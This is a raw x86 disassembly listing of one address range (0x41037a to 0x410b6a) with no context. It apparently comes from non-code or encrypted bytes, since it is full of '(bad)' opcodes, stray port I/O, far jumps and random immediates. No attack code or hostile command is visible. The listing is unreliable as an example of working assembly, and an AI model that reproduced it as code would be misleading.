  41037a:	sub    BYTE PTR [ecx+ebx*2-0x468d7955],dl
  410381:	into   
  410382:	add    DWORD PTR ss:[esi],ebp
  410385:	in     al,0xd4
  410387:	lahf   
  410388:	ins    DWORD PTR es:[edi],dx
  410389:	mov    dh,0xda
  41038b:	ret    0x940
  41038e:	jno    0x4103fb
  410390:	or     al,0xfa
  410392:	xor    BYTE PTR [ecx-0x45],dh
  410395:	jg     0x410383
  410397:	inc    ecx
  410398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410399:	rol    esp,0x4a
  41039c:	jmp    0x7aa8:0x317a53da
  4103a3:	xor    DWORD PTR [ebx+0x4a],0x2a9cdc9d
  4103aa:	test   DWORD PTR [esi-0x47721de3],ecx
  4103b0:	(bad)  
  4103b1:	popf   
  4103b2:	xchg   esi,eax
  4103b3:	xor    esp,esp
  4103b5:	stos   BYTE PTR es:[edi],al
  4103b6:	movnti DWORD PTR [edi+eax*4+0x2a612c1c],ebx
  4103be:	sbb    BYTE PTR [ebp+0x4f],dh
  4103c1:	cld    
  4103c2:	ds jno 0x4103aa
  4103c5:	sar    BYTE PTR [ebx+0x7a],1
  4103c8:	sbb    al,0xf
  4103ca:	dec    edx
  4103cb:	mov    bl,0x9
  4103cd:	sub    DWORD PTR [edx-0x680534bc],0x6eafa756
  4103d7:	inc    edx
  4103d8:	push   ebx
  4103d9:	ss js  0x410426
  4103dc:	xchg   ebx,eax
  4103dd:	push   esi
  4103de:	cwde   
  4103df:	xchg   esp,eax
  4103e0:	nop    ecx
  4103e3:	fimul  DWORD PTR [eiz*1-0x14169d35]
  4103ea:	adc    DWORD PTR [ecx+0x51],ebp
  4103ed:	dec    edx
  4103ee:	xor    esp,eax
  4103f0:	mov    bh,0xfa
  4103f2:	mov    esp,ebp
  4103f4:	adc    ecx,DWORD PTR [ebx+ebx*4+0xc72f2f0]
  4103fb:	jg     0x4103da
  4103fd:	loopne 0x4103fa
  4103ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410400:	pop    ds
  410401:	cmp    al,0x5b
  410403:	pusha  
  410404:	xor    BYTE PTR [ecx],ah
  410406:	xchg   edx,eax
  410407:	test   bh,ch
  410409:	iret   
  41040a:	push   eax
  41040b:	and    al,0x17
  41040d:	sub    dh,BYTE PTR [eax+0x1e551f93]
  410413:	push   ebp
  410414:	mov    edi,0x9ab47f31
  410419:	mov    DWORD PTR [eax],edx
  41041b:	(bad)  
  41041c:	repz fs push esi
  41041f:	ret    
  410420:	xchg   ecx,eax
  410421:	adc    DWORD PTR [esi],eax
  410423:	sbb    eax,0xcf0510d0
  410428:	push   0x2b0d79d0
  41042d:	cs xchg ebp,eax
  41042f:	mov    ecx,0x736776a7
  410434:	xchg   edx,eax
  410435:	or     al,BYTE PTR [esi-0x31]
  410438:	sub    ebx,DWORD PTR ds:0x5cbb6c8e
  41043e:	das    
  41043f:	sti    
  410440:	icebp  
  410441:	fcomi  st,st(2)
  410443:	push   edi
  410444:	jne    0x4104ba
  410446:	or     DWORD PTR [edx+ecx*1+0x3],esp
  41044a:	mov    WORD PTR [ecx],ss
  41044c:	outs   dx,BYTE PTR ds:[esi]
  41044d:	outs   dx,BYTE PTR ds:[esi]
  41044e:	push   eax
  41044f:	push   es
  410450:	ret    
  410451:	dec    eax
  410452:	mov    ds:0x30d534fa,eax
  410457:	sti    
  410458:	xchg   ebp,eax
  410459:	cmp    bl,BYTE PTR [edi-0x13e70ddb]
  41045f:	(bad)  [edi-0x673b0c01]
  410465:	and    DWORD PTR [eax+ebp*8-0x1ee369b7],edx
  41046c:	imul   ebp,DWORD PTR [esi-0xf],0xffffffd6
  410470:	pop    es
  410471:	call   0xa69efc18
  410476:	cs daa 
  410478:	sbb    al,0x2d
  41047a:	xchg   ecx,eax
  41047b:	aas    
  41047c:	mov    edi,0xd48897b7
  410481:	aam    0x9d
  410483:	or     al,BYTE PTR [esi-0x59]
  410486:	xor    al,0x9a
  410488:	and    eax,0xd1292538
  41048d:	cmp    eax,0x38706ed0
  410492:	or     dl,BYTE PTR [edx]
  410494:	inc    edi
  410495:	mov    bh,0x40
  410497:	call   0xcaebf8db
  41049c:	mov    WORD PTR [ecx-0x7f2118d0],cs
  4104a2:	sub    eax,0x5d5b06e7
  4104a7:	xor    ebx,DWORD PTR [esi]
  4104a9:	stos   BYTE PTR es:[edi],al
  4104aa:	sub    DWORD PTR [esi+0x4e26b090],0xbcd0b645
  4104b4:	lods   al,BYTE PTR ds:[esi]
  4104b5:	adc    dh,dl
  4104b7:	outs   dx,BYTE PTR ds:[esi]
  4104b8:	add    al,0x3d
  4104ba:	lods   eax,DWORD PTR fs:[esi]
  4104bc:	fcmovnu st,st(3)
  4104be:	fmul   st(6),st
  4104c0:	adc    DWORD PTR [eax],edi
  4104c2:	aaa    
  4104c3:	ds sub ah,0xde
  4104c7:	(bad)  
  4104c8:	into   
  4104c9:	cmp    al,0xa4
  4104cb:	cld    
  4104cc:	test   ebx,0x1b4f3a81
  4104d2:	mov    esi,0x189ecee7
  4104d7:	cmp    DWORD PTR [esi],edi
  4104d9:	aaa    
  4104da:	jbe    0x41054d
  4104dc:	push   ss
  4104dd:	mov    dh,BYTE PTR [esi]
  4104df:	mov    esp,0x95dfb09b
  4104e4:	in     al,0x73
  4104e6:	mov    edx,ds
  4104e8:	ss jecxz 0x410492
  4104eb:	inc    esi
  4104ec:	mov    ecx,0x59aa14be
  4104f1:	or     eax,0x4af5fa81
  4104f6:	in     al,0x92
  4104f8:	mov    dl,0xfb
  4104fa:	push   ebp
  4104fb:	push   esp
  4104fc:	mov    cl,0x7f
  4104fe:	jge    0x4104dd
  410500:	ins    DWORD PTR es:[edi],dx
  410501:	int3   
  410502:	cdq    
  410503:	dec    ecx
  410504:	and    eax,0x9d60092f
  410509:	dec    ecx
  41050a:	sbb    ebx,esi
  41050c:	fstp   DWORD PTR [edx-0x73]
  41050f:	aas    
  410510:	(bad)  
  410511:	xor    ebp,DWORD PTR [ebp-0x2d47a95e]
  410517:	hlt    
  410518:	out    0x37,al
  41051a:	outs   dx,DWORD PTR ds:[esi]
  41051b:	xlat   BYTE PTR ds:[ebx]
  41051c:	sbb    esp,DWORD PTR [ebx]
  41051e:	jbe    0x410516
  410520:	data16 stc 
  410522:	ja     0x41057c
  410524:	sub    DWORD PTR [edx-0x10],edi
  410527:	sti    
  410528:	sub    al,0x3a
  41052a:	xor    ch,bh
  41052c:	stos   BYTE PTR es:[edi],al
  41052d:	mov    ah,BYTE PTR [ecx]
  41052f:	xchg   ebx,eax
  410530:	lahf   
  410531:	hlt    
  410532:	pop    edi
  410533:	push   eax
  410534:	or     DWORD PTR [ebx+edx*2],ebx
  410537:	add    al,0x83
  410539:	js     0x4104cb
  41053b:	xor    cl,BYTE PTR [ebx+0x6267b464]
  410541:	xor    al,0x59
  410543:	fs leave 
  410545:	xchg   edi,eax
  410546:	and    edi,eax
  410548:	shl    DWORD PTR [esi+0x17f5a0b2],1
  41054e:	test   DWORD PTR [ebx+eax*1],esi
  410551:	or     al,0x79
  410553:	xor    eax,0x90935ff1
  410558:	outs   dx,BYTE PTR ds:[esi]
  410559:	pop    ecx
  41055a:	mov    ecx,0x779c9370
  41055f:	out    dx,al
  410560:	les    ecx,FWORD PTR [eax-0x1ffdf357]
  410566:	dec    esp
  410567:	push   eax
  410568:	outs   dx,BYTE PTR ds:[esi]
  410569:	scas   eax,DWORD PTR es:[edi]
  41056a:	dec    ebx
  41056b:	mov    eax,ds:0xe7f1e605
  410570:	mov    bh,0x5
  410572:	test   BYTE PTR [eax],dl
  410574:	out    dx,al
  410575:	in     eax,0x93
  410577:	bound  ecx,QWORD PTR [edi-0x1e]
  41057a:	and    BYTE PTR [ecx+edx*2-0x77b2b250],al
  410581:	pop    edi
  410582:	inc    esp
  410583:	lds    eax,FWORD PTR [ecx+0x2ef87f49]
  410589:	fstp   QWORD PTR [edx-0x1f6104b2]
  41058f:	cmc    
  410590:	hlt    
  410591:	push   es
  410592:	cli    
  410593:	push   esi
  410594:	xor    DWORD PTR [ebx-0x49],esi
  410597:	push   esi
  410598:	clc    
  410599:	test   DWORD PTR [esi-0x62e9b659],edx
  41059f:	add    eax,0x11
  4105a2:	dec    ebx
  4105a3:	enter  0x1be5,0x7a
  4105a7:	adc    eax,0xe4bd054a
  4105ac:	inc    ebx
  4105ad:	cmp    DWORD PTR [ebx],0xffffffce
  4105b0:	pop    ebp
  4105b1:	mov    ecx,0x7ae28f6d
  4105b6:	or     BYTE PTR [edi-0x791c5970],ah
  4105bc:	(bad)  
  4105bd:	clc    
  4105be:	add    BYTE PTR [edx+0x5f],0xd3
  4105c2:	sub    ecx,ebp
  4105c4:	scas   eax,DWORD PTR es:[edi]
  4105c5:	je     0x410626
  4105c7:	mov    DWORD PTR [esi-0x3e],edx
  4105ca:	mov    fs,WORD PTR [ebx+0x65]
  4105cd:	mov    BYTE PTR [edx+0x68205384],0x93
  4105d4:	cli    
  4105d5:	cmp    bl,BYTE PTR [edi*8-0x56175440]
  4105dc:	xchg   esi,edx
  4105de:	xchg   esp,eax
  4105df:	sbb    BYTE PTR [ecx+0x25362b3e],0xe4
  4105e6:	jl     0x41056a
  4105e8:	inc    ebp
  4105e9:	pop    ecx
  4105ea:	popa   
  4105eb:	jmp    0x4105ae
  4105ed:	icebp  
  4105ee:	push   es
  4105ef:	add    ebx,edx
  4105f1:	add    BYTE PTR [edx-0x32b64aa1],0x8f
  4105f8:	and    edx,DWORD PTR [edi]
  4105fa:	push   ebx
  4105fb:	mov    ah,0x8b
  4105fd:	adc    DWORD PTR [ebp+0x2290ab0b],esi
  410603:	push   eax
  410604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410605:	jle    0x410644
  410607:	mov    edx,0x50779220
  41060c:	stos   BYTE PTR es:[edi],al
  41060d:	sbb    eax,0x72b46d73
  410612:	pop    esi
  410613:	lods   al,BYTE PTR ds:[esi]
  410614:	inc    ebx
  410615:	pop    ecx
  410616:	jecxz  0x410598
  410618:	loopne 0x410638
  41061a:	sar    ebx,1
  41061c:	gs cdq 
  41061e:	and    ch,dl
  410620:	shl    DWORD PTR [edx],1
  410622:	mov    al,ds:0x56c74d5a
  410627:	sti    
  410628:	imul   ecx,DWORD PTR [esi],0xcfc65cbf
  41062e:	add    esi,ebx
  410630:	dec    esi
  410631:	pop    ss
  410632:	stc    
  410633:	cs jmp 0x192a92b5
  410639:	mov    ecx,0x547f7daa
  41063e:	or     esi,DWORD PTR [edx]
  410640:	push   esp
  410641:	scas   al,BYTE PTR es:[edi]
  410642:	out    0x94,eax
  410644:	retf   
  410645:	aam    0x9d
  410647:	or     DWORD PTR [esi],eax
  410649:	out    0x8d,eax
  41064b:	fnstcw WORD PTR [eax]
  41064d:	test   ebx,0xac243811
  410653:	or     eax,0xde99aced
  410658:	lahf   
  410659:	push   0x53
  41065b:	adc    eax,DWORD PTR fs:0xa6b12703
  410662:	and    eax,0x156013a2
  410667:	in     eax,dx
  410668:	or     edx,eax
  41066a:	jecxz  0x41067b
  41066c:	sub    dh,BYTE PTR [eax]
  41066e:	push   ebp
  41066f:	stc    
  410670:	loop   0x4105f7
  410672:	retf   
  410673:	mov    ds:0xa926912f,eax
  410678:	push   ebp
  410679:	or     al,0x58
  41067b:	sub    al,0x9f
  41067d:	push   edi
  41067e:	mov    edx,0xe68843ab
  410683:	ss or  dl,dl
  410686:	je     0x410655
  410688:	fs out 0x94,al
  41068b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41068c:	add    dl,BYTE PTR [ecx+0x1]
  41068f:	push   ebx
  410690:	or     edi,DWORD PTR [edi]
  410692:	mov    bh,0x7
  410694:	(bad)  
  410695:	xor    dl,BYTE PTR [ebx+edx*1]
  410698:	clc    
  410699:	pop    edi
  41069a:	clc    
  41069b:	add    edx,ebx
  41069d:	jns    0x4106e6
  41069f:	mov    ecx,0x69120fc3
  4106a4:	xchg   DWORD PTR [esp+esi*2+0x110ae518],edi
  4106ab:	out    dx,eax
  4106ac:	sub    eax,0x6b4579bb
  4106b1:	dec    edi
  4106b2:	into   
  4106b3:	and    BYTE PTR [esi-0x5a],bl
  4106b6:	sbb    ebp,DWORD PTR [ebp+0x2857c217]
  4106bc:	fdiv   QWORD PTR [edi+0x1ba339]
  4106c2:	mov    ds:0x3860141d,al
  4106c7:	and    DWORD PTR [eax],edi
  4106c9:	sti    
  4106ca:	xor    eax,0xd16e2564
  4106cf:	addr16 push 0xffffff99
  4106d2:	(bad)  
  4106d3:	(bad)  
  4106d4:	pop    es
  4106d5:	out    dx,al
  4106d6:	adc    BYTE PTR [ecx],ah
  4106d8:	gs popf 
  4106da:	mov    bh,0xeb
  4106dc:	retf   0x1212
  4106df:	jb     0x4106ea
  4106e1:	xchg   ecx,eax
  4106e2:	add    DWORD PTR [esi],eax
  4106e4:	rcr    dl,1
  4106e6:	dec    esp
  4106e7:	sub    ecx,ebp
  4106e9:	in     al,0xf8
  4106eb:	aas    
  4106ec:	push   edi
  4106ed:	call   0xf28c:0xa682871e
  4106f4:	call   0x7f4fdb81
  4106f9:	sbb    esp,DWORD PTR [ebp+0x61491966]
  4106ff:	xor    ebp,DWORD PTR [edx+0x2d]
  410702:	dec    BYTE PTR [edi]
  410704:	in     eax,0xd0
  410706:	out    0x31,eax
  410708:	sub    dh,BYTE PTR [edi*1-0x1092503a]
  41070f:	mov    ds:0x14a9372c,al
  410714:	add    DWORD PTR [edi],edx
  410716:	shl    DWORD PTR [esi-0x1018d152],1
  41071c:	jmp    0x410726
  41071e:	xchg   edx,eax
  41071f:	(bad)  
  410720:	fwait
  410721:	dec    BYTE PTR [ebp+0x5262178f]
  410727:	fsubr  QWORD PTR gs:[ecx-0x6f]
  41072b:	adc    al,0x34
  41072d:	jge    0x41072c
  41072f:	icebp  
  410730:	mov    ebp,0xa0e5b8e5
  410735:	mov    eax,ds:0x661977be
  41073a:	push   es
  41073b:	inc    esi
  41073c:	bound  edx,QWORD PTR [ebp-0x31]
  41073f:	jnp    0x410789
  410741:	or     bh,BYTE PTR [edi+0x748f4545]
  410747:	jg     0x4106e0
  410749:	jmp    0x6881419
  41074e:	vandnps ymm1,ymm2,YMMWORD PTR [ebp-0x4]
  410753:	in     eax,0x20
  410755:	es inc edi
  410757:	in     al,0xf0
  410759:	fild   QWORD PTR [ebp-0x11]
  41075c:	fiadd  WORD PTR [eax]
  41075e:	inc    edi
  41075f:	adc    al,0x98
  410761:	pop    eax
  410762:	lahf   
  410763:	push   esi
  410764:	out    dx,al
  410765:	mov    eax,ds:0x6e43448a
  41076a:	cmp    edx,ebx
  41076c:	scas   eax,DWORD PTR es:[edi]
  41076d:	inc    edi
  41076e:	sub    al,BYTE PTR [ebx+0x44c31655]
  410774:	mov    dh,0x8b
  410776:	jno    0x41079d
  410778:	cmp    BYTE PTR [eax+0x73c2227f],al
  41077e:	jno    0x4107b0
  410780:	int3   
  410781:	mov    ?,ecx
  410783:	out    dx,eax
  410784:	hlt    
  410785:	fidivr WORD PTR [eax-0x734e6ed]
  41078b:	call   0x34cc:0x7b5e09e8
  410792:	sbb    esi,DWORD PTR ds:0x705fde5b
  410798:	jl     0x41074b
  41079a:	xchg   esp,eax
  41079b:	mov    eax,ds:0x692b5eaa
  4107a0:	lea    esp,[esp+edi*1-0x75fa8664]
  4107a7:	xchg   edi,eax
  4107a8:	mov    edx,0xea53474b
  4107ad:	mov    esi,0x1819db56
  4107b2:	sub    al,0xe
  4107b4:	sub    ecx,DWORD PTR [ebx]
  4107b6:	add    eax,0xf1763ea2
  4107bb:	je     0x41080d
  4107bd:	iret   
  4107be:	imul   eax,DWORD PTR [ebx-0x4b],0xffffff81
  4107c2:	pop    ebx
  4107c3:	ja     0x410812
  4107c5:	scas   eax,DWORD PTR es:[edi]
  4107c6:	push   edi
  4107c7:	ja     0x41074d
  4107c9:	inc    edx
  4107ca:	scas   eax,DWORD PTR es:[edi]
  4107cb:	fdiv   QWORD PTR [esi+edx*2+0x3f370e06]
  4107d2:	pop    ds
  4107d3:	pop    esp
  4107d4:	push   ds
  4107d5:	lock int3 
  4107d7:	push   ds
  4107d8:	lods   al,BYTE PTR ds:[esi]
  4107d9:	push   edx
  4107da:	loopne 0x4107cf
  4107dc:	xchg   BYTE PTR [edx+0x6d],bh
  4107df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107e0:	jmp    0x5878:0x53d49d94
  4107e7:	and    DWORD PTR [eax+0x49],0xffffffe9
  4107eb:	mov    al,ds:0xbdcff232
  4107f0:	scas   al,BYTE PTR es:[edi]
  4107f1:	nop
  4107f2:	xchg   ebp,eax
  4107f3:	jnp    0x41083d
  4107f5:	out    dx,eax
  4107f6:	sbb    cl,0x4c
  4107f9:	xchg   BYTE PTR [edi+eax*2+0x61a1c57],bl
  410800:	and    bl,BYTE PTR ds:0x2df8ccde
  410806:	in     al,0xf4
  410808:	aaa    
  410809:	jbe    0x41079f
  41080b:	cmp    dl,dl
  41080d:	mov    ah,0xd1
  41080f:	mov    ds:0x72ad5a60,al
  410814:	rcr    BYTE PTR [ecx+0x449dec49],cl
  41081a:	int    0xde
  41081c:	fisttp QWORD PTR [edi-0x3638603]
  410822:	(bad)  
  410823:	fisttp QWORD PTR [eax+eax*8-0x6d05f17d]
  41082a:	sub    BYTE PTR [ecx],0xe3
  41082d:	mov    DWORD PTR [eax-0x6353effc],esi
  410833:	adc    DWORD PTR [eax-0x66d65b54],0x4b
  41083a:	rol    DWORD PTR [edx-0x1c19460e],0xcf
  410841:	ins    BYTE PTR es:[edi],dx
  410842:	cdq    
  410843:	lahf   
  410844:	pushf  
  410845:	(bad)  
  410846:	mov    BYTE PTR [edi],dh
  410848:	aam    0x2b
  41084a:	fsubp  st(2),st
  41084c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41084d:	add    dl,dl
  41084f:	cmp    ebp,ebx
  410851:	mov    dl,0x6c
  410853:	cwde   
  410854:	daa    
  410855:	rcr    DWORD PTR [ecx-0x39ca1d17],1
  41085b:	fimul  DWORD PTR [ecx-0x333756c7]
  410861:	push   ss
  410862:	jmp    0x410825
  410864:	adc    DWORD PTR [ebp+eiz*1-0x3675a8d6],esp
  41086b:	ja     0x4108e5
  41086d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41086e:	(bad)  
  41086f:	bound  edx,QWORD PTR [eax-0x65ee9132]
  410875:	xchg   esi,eax
  410876:	mov    al,ds:0xb6a2e7f4
  41087b:	jns    0x410822
  41087d:	stc    
  41087e:	or     al,0x70
  410880:	adc    bh,bl
  410882:	mov    ecx,0x6347acd3
  410887:	mov    esp,0x1693729f
  41088c:	xor    eax,0x71fd2427
  410891:	jae    0x4108f6
  410893:	or     DWORD PTR [edi],ebx
  410895:	xchg   ecx,eax
  410896:	lods   al,BYTE PTR ds:[esi]
  410897:	xor    eax,0xc26c0b57
  41089c:	cli    
  41089d:	call   0xffdd:0xb01e3e88
  4108a4:	sub    DWORD PTR [eax-0x64],edx
  4108a7:	dec    ebp
  4108a8:	mov    bl,0xa3
  4108aa:	jo     0x4108f8
  4108ac:	shr    BYTE PTR [edi+0x7c7831],cl
  4108b2:	mov    ds:0x772f8db6,eax
  4108b7:	push   edi
  4108b8:	and    DWORD PTR [ecx],ecx
  4108ba:	jle    0x41092b
  4108bc:	into   
  4108bd:	clc    
  4108be:	int    0xbc
  4108c0:	dec    ebx
  4108c1:	jg     0x410932
  4108c3:	xchg   edx,eax
  4108c4:	sar    esi,0xd6
  4108c7:	out    0xcd,al
  4108c9:	dec    esi
  4108ca:	sbb    ebx,0x1a20bb78
  4108d0:	sub    DWORD PTR [esi-0x69],ecx
  4108d3:	push   esp
  4108d4:	mov    edi,0x6ad71741
  4108d9:	inc    esi
  4108da:	pop    esp
  4108db:	jnp    0x410871
  4108dd:	dec    edx
  4108de:	ins    BYTE PTR es:[edi],dx
  4108df:	and    edi,0xffffffdb
  4108e2:	scas   eax,DWORD PTR es:[edi]
  4108e3:	dec    edi
  4108e4:	dec    ebx
  4108e5:	nop
  4108e6:	push   ss
  4108e7:	imul   esp,DWORD PTR [ebx],0xffffffe6
  4108ea:	mov    BYTE PTR [edx],0x98
  4108ed:	dec    edi
  4108ee:	mov    dh,0x96
  4108f0:	ds jp  0x410929
  4108f3:	leave  
  4108f4:	ret    
  4108f5:	and    BYTE PTR [ebx+0x13],0xd6
  4108f9:	daa    
  4108fa:	or     DWORD PTR [edx],0x4538aa10
  410900:	mov    cl,0x45
  410902:	in     al,dx
  410903:	fidivr WORD PTR [eax-0x677bb6d8]
  410909:	add    eax,0xb43f7c27
  41090e:	addr16 pop ebx
  410910:	inc    ebx
  410911:	and    ebp,esi
  410913:	stos   DWORD PTR es:[edi],eax
  410914:	ror    esi,0x40
  410917:	adc    eax,0x792d250
  41091c:	xlat   BYTE PTR ds:[ebx]
  41091d:	mov    edx,0x6d7b372d
  410922:	adc    ah,BYTE PTR [esi+0x6ba9ce67]
  410928:	icebp  
  410929:	mov    ch,0xbb
  41092b:	enter  0xe2d9,0xd2
  41092f:	lods   eax,DWORD PTR ds:[esi]
  410930:	fldcw  WORD PTR [eax+0x4]
  410933:	xchg   edi,eax
  410934:	mov    bl,0x25
  410936:	add    ebx,0xffffffed
  410939:	jae    0x41090e
  41093b:	push   es
  41093c:	iret   
  41093d:	jg     0x4109b5
  41093f:	cmp    eax,0xe9bfb556
  410944:	out    dx,al
  410945:	mov    esi,0x6d3b59b6
  41094a:	not    DWORD PTR [ebp+0x29]
  41094d:	mov    BYTE PTR [eax],bl
  41094f:	shr    ecx,cl
  410951:	fdivr  DWORD PTR [ebp+0x74]
  410954:	fisttp QWORD PTR [esi+ecx*2]
  410957:	outs   dx,DWORD PTR ds:[esi]
  410958:	pusha  
  410959:	ficom  WORD PTR [edi-0x241a218a]
  41095f:	out    0xea,eax
  410961:	stc    
  410962:	inc    edi
  410963:	cmp    DWORD PTR [edi+0x704c2a16],esp
  410969:	add    al,0xd7
  41096b:	shr    DWORD PTR [edx-0x6],cl
  41096e:	pop    eax
  41096f:	or     cl,bl
  410971:	sub    eax,0x54f337ba
  410976:	and    al,0x65
  410978:	loop   0x410902
  41097a:	sbb    ah,bl
  41097c:	jl     0x4109a8
  41097e:	rol    BYTE PTR ds:0xc4796907,1
  410984:	push   0xffffffbe
  410986:	sub    edi,ecx
  410988:	lods   eax,DWORD PTR ds:[esi]
  410989:	inc    ecx
  41098a:	nop
  41098b:	add    al,0x70
  41098d:	xor    BYTE PTR [ebp-0x7b40f08f],cl
  410993:	sbb    ch,BYTE PTR [edi]
  410995:	pop    edx
  410996:	fidivr DWORD PTR [esi+0x52cd1788]
  41099c:	inc    esp
  41099d:	pop    ebp
  41099e:	cmp    eax,0x8435f0f4
  4109a3:	pop    ebx
  4109a4:	push   edi
  4109a5:	scas   al,BYTE PTR es:[edi]
  4109a6:	sbb    dh,BYTE PTR [ecx-0x57]
  4109a9:	cmc    
  4109aa:	(bad)  
  4109ab:	or     cl,dl
  4109ad:	sbb    eax,0x418b04d
  4109b2:	cmp    eax,0x5b0e7f7a
  4109b7:	sahf   
  4109b8:	sub    cl,cl
  4109ba:	xchg   ebp,eax
  4109bb:	sar    DWORD PTR [edx+0x4b401aa2],1
  4109c1:	fild   QWORD PTR [edx-0x22]
  4109c4:	fild   DWORD PTR [esi+ecx*4-0x3ce8a72c]
  4109cb:	sub    al,0xfb
  4109cd:	add    bh,al
  4109cf:	jbe    0x410994
  4109d1:	push   esi
  4109d2:	ret    
  4109d3:	xchg   DWORD PTR [eax+0x4],ebx
  4109d6:	test   BYTE PTR [esi-0x6d],dh
  4109d9:	mov    al,0x6b
  4109db:	aam    0xad
  4109dd:	sub    BYTE PTR ds:0xecf6c5ee,0x94
  4109e4:	xchg   ecx,eax
  4109e5:	test   al,0x31
  4109e7:	push   0xcca47f7a
  4109ec:	jbe    0x410a4b
  4109ee:	ror    BYTE PTR [ebx],0x20
  4109f1:	daa    
  4109f2:	dec    DWORD PTR [esi+eax*2-0x109d1e8d]
  4109f9:	lds    ebp,FWORD PTR [eax+0x20]
  4109fc:	or     eax,0xfb9a394f
  410a01:	fwait
  410a02:	jae    0x410a65
  410a04:	leave  
  410a05:	push   ebx
  410a06:	ins    DWORD PTR es:[edi],dx
  410a07:	out    0x4e,al
  410a09:	dec    eax
  410a0a:	sub    eax,0x17dd86f4
  410a0f:	mov    ecx,0x8b4dbbd6
  410a14:	loope  0x410a54
  410a16:	ins    DWORD PTR es:[edi],dx
  410a17:	int    0x75
  410a19:	inc    eax
  410a1a:	shl    DWORD PTR [edi+0x25],1
  410a1d:	adc    eax,0x8654766c
  410a22:	(bad)  
  410a23:	adc    ebp,DWORD PTR [esp+edi*1-0x72bf5201]
  410a2a:	(bad)  
  410a2b:	fmul   DWORD PTR [ebp-0x7b0e75c1]
  410a31:	mov    dh,0x78
  410a33:	lods   eax,DWORD PTR ds:[esi]
  410a34:	push   esi
  410a35:	ficom  DWORD PTR [ecx]
  410a37:	cli    
  410a38:	push   eax
  410a39:	cmp    BYTE PTR [ebx+0x26],0x47
  410a3d:	push   0xffffffd2
  410a3f:	outs   dx,DWORD PTR ds:[esi]
  410a40:	xchg   edi,eax
  410a41:	cmp    dh,BYTE PTR [ebx-0x7a73545c]
  410a47:	xor    BYTE PTR [ebp+0x31],al
  410a4a:	fdivr  QWORD PTR [ebp-0x3ba20768]
  410a50:	aaa    
  410a51:	ins    BYTE PTR es:[edi],dx
  410a52:	leave  
  410a53:	cld    
  410a54:	cmp    BYTE PTR [edx-0x12fb6945],ah
  410a5a:	jle    0x410aaf
  410a5c:	mov    WORD PTR [ebp+0x65ab6331],dx
  410a63:	outs   dx,DWORD PTR ds:[esi]
  410a64:	fdiv   st,st(6)
  410a66:	cmp    DWORD PTR [esi-0x74969fc3],edx
  410a6c:	retf   0xdf21
  410a6f:	xor    BYTE PTR [eax+ebp*4-0x7d6a7acc],0xcb
  410a77:	mov    ecx,0x30f3acab
  410a7c:	add    edi,DWORD PTR [ebx+edx*1-0x16dec8b]
  410a83:	cdq    
  410a84:	fwait
  410a85:	push   esp
  410a86:	mov    dh,0x40
  410a88:	fimul  WORD PTR [ecx]
  410a8a:	adc    ah,bh
  410a8c:	aas    
  410a8d:	jmp    0x410aee
  410a8f:	pop    es
  410a90:	(bad)  [ecx-0x47]
  410a93:	les    edi,FWORD PTR fs:[esi-0x5f]
  410a97:	cli    
  410a98:	xor    DWORD PTR [ecx],0x41
  410a9b:	push   ss
  410a9c:	sbb    DWORD PTR [ebx+0x7f392f8e],ebp
  410aa2:	jle    0x410aca
  410aa4:	push   edx
  410aa5:	dec    esp
  410aa6:	inc    eax
  410aa7:	or     ch,BYTE PTR [esi+0x7a7eb0c2]
  410aad:	daa    
  410aae:	cld    
  410aaf:	xchg   esi,eax
  410ab0:	dec    ebp
  410ab1:	pop    esp
  410ab2:	mov    ebp,0x6a9e49bd
  410ab7:	jge    0x410b02
  410ab9:	inc    ebp
  410aba:	and    esi,DWORD PTR [edx+ecx*1+0x0]
  410abe:	fwait
  410abf:	sbb    eax,0xd8fd070
  410ac4:	dec    ebp
  410ac5:	loop   0x410add
  410ac7:	aas    
  410ac8:	repz out dx,eax
  410aca:	ja     0x410b0a
  410acc:	mov    ebx,0xbb63ee19
  410ad1:	mov    esi,0xd37de3c3
  410ad6:	mov    ds:0x75c11108,al
  410adb:	dec    edx
  410adc:	retf   
  410add:	jb     0x410b26
  410adf:	mov    ah,0x95
  410ae1:	or     esi,0x7c9ebcf1
  410ae7:	test   al,0x78
  410ae9:	adc    DWORD PTR [eax+edx*4+0x5d],ebp
  410aed:	loopne 0x410b5a
  410aef:	push   edx
  410af0:	sbb    DWORD PTR [ecx+ebp*2],ecx
  410af3:	(bad)  
  410af4:	xor    eax,0xf611eada
  410af9:	pop    ecx
  410afa:	lods   eax,DWORD PTR ds:[esi]
  410afb:	(bad)  
  410afc:	icebp  
  410afd:	mov    ss,WORD PTR [edi]
  410aff:	dec    esp
  410b00:	gs dec ecx
  410b02:	les    esp,FWORD PTR [edx+0x4c]
  410b05:	fsub   QWORD PTR [ebp*4-0x492133b8]
  410b0c:	mov    es,WORD PTR [ecx+ecx*8]
  410b0f:	fdivr  QWORD PTR [edi-0x35]
  410b12:	fidiv  WORD PTR [esp+ebx*1-0x5e5383de]
  410b19:	pop    edx
  410b1a:	push   ebp
  410b1b:	sub    ebx,DWORD PTR [esi]
  410b1d:	cmp    al,0x7
  410b1f:	mov    bh,0x22
  410b21:	xchg   ecx,eax
  410b22:	(bad)  [edx+0x48]
  410b25:	push   ebp
  410b26:	ret    0x4e9
  410b29:	test   ebp,esp
  410b2b:	daa    
  410b2c:	jnp    0x410b88
  410b2e:	pop    ecx
  410b2f:	aam    0xea
  410b31:	test   BYTE PTR [ecx+0x59],ah
  410b34:	mov    dh,BYTE PTR [esi+0x6b]
  410b37:	mov    eax,0xbe1e6ca2
  410b3c:	cmp    eax,0x8ffd9e4e
  410b41:	xor    eax,0xae706596
  410b46:	adc    BYTE PTR fs:[ecx+edi*4],cl
  410b4a:	mov    edi,0xa6f50685
  410b4f:	adc    al,0xca
  410b51:	loopne 0x410b0f
  410b53:	mov    eax,0xaad80e3b
  410b58:	aaa    
  410b59:	xchg   DWORD PTR [ecx],ebx
  410b5b:	xor    eax,0xd9454ffd
  410b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b61:	(bad)  
  410b62:	ss push ecx
  410b64:	jne    0x410b04
  410b66:	push   edi
  410b67:	pcmpgtd mm1,mm3
  410b6a:	jmp    0xeb61:0xbbd0bff5
